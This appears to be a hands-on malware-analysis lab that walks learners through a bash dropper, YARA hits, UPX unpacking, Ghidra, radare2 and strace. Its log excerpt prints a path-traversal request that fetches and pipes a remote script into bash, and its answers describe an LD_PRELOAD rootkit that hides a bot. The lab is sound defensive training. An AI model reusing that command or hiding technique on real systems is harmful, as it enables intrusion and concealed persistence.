## Investigating The Bash Dropper
Revisiting the odd entry we found in the 01_Log_Analysis section, a script was hosted at host "linux-mirrors.com/broc2022".
Go and fetch that within the Vagrant environment for analysis. Consider in a real world situation, you'd never want to 
do this from a machine that is identifiable to you or your organization. Secure networking and safe malware detonation environments are key for malware analysis.

``` sh
147.182.251.241 - - [12/Mar/2022:23:43:15 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh -c wget irc.linux-mirrors.com/broc2022/gplatepwn.sh | bash HTTP/1.1" 200 1889 "-" "python-requests/2.27.1"
```

Leveraging a text editor of your choice, analyze what the script does. 

* [ ] Are there additional payloads? 
* [ ] Are there any links to potential personas?
* [ ] Are there host base indicators that you could build YARA rules for?

<details><summary> Answer: Additional payloads </summary>

* Yes!, located at: linux-mirrors.com/abcedfgabcedfg/avatar.tar.gz
Grab this file as it has more payloads we'll look at.

</details>

<details><summary> Answer: Additional potential personas</summary>

* Yes!, the public keys are being obtained from github user "Henry Ettahots".

</details>

<details><summary> Answer: Host based IoCS</summary>

* Yes!, the /tmp/.gplate directory appears to be a staging directory for APT585.

</details>


## Yara - Has anyone seen this before?
It's far too time consuming to manually analyze every single suspicious sample that
comes into your life. Stand on the shoulders of giants and leverage YARA rules to help quickly triage
things that may be interesting/important to dive into. When leveraging automated tools for analysis consider their limitations. 
For example, are the YARA rules you're using from a well known repo or just something random you found on the internet?


``` sh
$> yara ./rules/index.yar DOWNLOADED_MALWARE_DIR/
```

* Did anything hit on a yara rule?
* What what the yara rule?
<details><summary> Post-Yara execution</summary>
  ldpreload malware//libd.so
  BLOWFISH_Constants malware//kauditdd.x64
  MD5_Constants malware//kauditdd.x64
  SHA512_Constants malware//kauditdd.x64
  SHA2_BLAKE2_IVs malware//kauditdd.x64
  WHIRLPOOL_Constants malware//kauditdd.x64
  BLOWFISH_Constants malware//kauditdd.arm64
  SHA2_BLAKE2_IVs malware//kauditdd.arm64
</details>

Yara has numerous CLI arguments to provide more information on "hits". 

```-S``` will print the matching strings to give you more insight into WHY something matched. Re-execute as follows:

``` sh
$> yara -S ./rules/index.yar DOWNLOADED_MALWARE_DIR/
```

## Ghidra Triage
Before loading the binary into Ghidra, let's run strings on the binary. 
Are there anything that indicates we'd have issues in loading and analyzing the binary?
If so, how do we fix this?

<details><summary> Answer: Fixing the binary to be loaded</summary>
* Yes!, binary is packed with UPX. Running strings will show "UPX!" in the output, but loading the binary
would also show this into two segments. For more info on identifying UPX packed executables checkout  [this blog](https://www.archcloudlabs.com/projects/ghidra_scripting_01/).
To unpack the binary, execute:

``` sh
$> upx -d name_of_binary.bin
```
</details>

Now, load the binary into Ghidra and let's find main!
Referencing the slides, remember the sequence is:
1. find ```entry``` within the symbol tree.
2. find ```__libc_start_main``` within entry, and the first argument is the main function.
Dive into the __libc_start_main structure [here](https://refspecs.linuxfoundation.org/LSB_2.0.1/LSB-Core/LSB-Core/baselib---libc-start-main-.html).
* Are there any interesting strings in this main function?
3. From what we discussed in the course, "clean up" main's decompilation and try to identify interesting strings.

## Investigating Shared Objects
The tar ball discovered on the attacker's infrastructure has a "libd.so" file, executing ```file libd.so``` shows that is indeed a 64 bit shared object file. While we could use Ghidra to analyze the shared object, we'll use this scenario to leverage ```radare2``` for triage. Shared Objects are ELF binaries that contain additional functionality that is leveraged by other executables at runtime. Shared Objects export functions for other libraries to use. However, just because a file is a Shared Object doesn't mean that ALL functions are exported for external use. These are referred to as "private functions"  To see what functions are being exported execute the following:

``` sh
$> r2 libd.so
[0x00001120]> iE
[Exports]

nth paddr      vaddr      bind   type size lib name
―――――――――――――――――――――――――――――――――――――――――――――――――――
19  0x000013d2 0x000013d2 GLOBAL FUNC 276      readdir64
20  0x000014e6 0x000014e6 GLOBAL FUNC 276      readdir

[0x00001120]> q
```

we see readdir and readdir64 being exported. Look up these syscalls (```man readdir```) and familiarize yourself with their functionality. What do they do normally, and how could they be abused by an attacker? Was there any indication of how libd.so was being used in the attacker's kill chain?  What type of attack is this?
Before looking at the answer, load libd.so into Ghdira, and try to identify whatelse the libd.so file is doing.

<details><summary> Answer: libd.so triage</summary>

The ```gplatepwn.sh``` script has an entry of echoing the path to "libd.so" into /etc/ld.so.preload prior to execution. Examining the disassembly, you'll discover the filename
that's being hidden. The goal of the Shared Object is to hide the bot when users list contents of directories which has a file name of "kauditdd". This is accomplished via a classic [LD_PRELOAD](https://attack.mitre.org/techniques/T1574/006/) attack. To experiment with this on your own, check out the following [repo](https://github.com/gianlucaborello/libprocesshider).

![proc-to-filter](./.imgs/process_to_filter.png)

</details>


## Tracing Applications w/ strace
*Note this is DYNAMIC execution, you're going to be running the application!*
**DO NOT DO THIS ON REAL SYSTEMS**

Let's find out where this binary tries to connect out to. While we could simply open up wireshark we're going to use strace to trace syscalls and discover outbound connections.
The strace utility as discussed is a very powerful utility
  * [ ] to see the syscalls a binary is making. In this example we'll show how to use strace to reveal the outbound network connection.

``` sh
$> strace -ff -o strace.log ./binary_of_interest
```

If the binary forks and creates a child process, a new file will be created with the name of "strace.log.<CHILD_PID>". 
Where <CHILD_PID> is the pid of the newly created child process. After letting the program run, execute ctrl+c
and take a look at the logs. Can you identify the outbound C2 server based on the syscalls?


## Bonus Round: OSINT Artifact Hunting 
<details><summary> Spoiler - open after finishing previous tasks</summary>
Investigate the Python script from the apt585/apache container. 
Does OSINT research lead you to what framework it's come from?

* What about the libd.so file?

* What about the kauditdd file?

</details>

